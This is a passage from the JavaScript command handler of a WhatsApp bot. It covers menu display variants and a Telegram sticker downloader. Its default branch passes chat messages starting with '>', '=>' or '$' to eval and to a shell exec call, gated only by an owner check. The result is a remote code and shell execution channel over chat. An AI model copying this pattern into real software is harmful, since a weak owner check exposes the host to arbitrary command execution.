                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    LostBoyTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./C-SMedia/menu2.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/s7huhm.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./C-SMedia/menu2.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    LostBoyTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
  
                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replyCsuit(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replyCsuit('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				LostBoyTechInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				LostBoyTechInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replyCsuit(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyCsuit(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyCsuit(bang)
                    }
                    try {
                        replyCsuit(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyCsuit(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyCsuit(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyCsuit(evaled)
                    } catch (err) {
                        await replyCsuit(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyCsuit(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyCsuit(err)
                        if (stdout) return replyCsuit(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})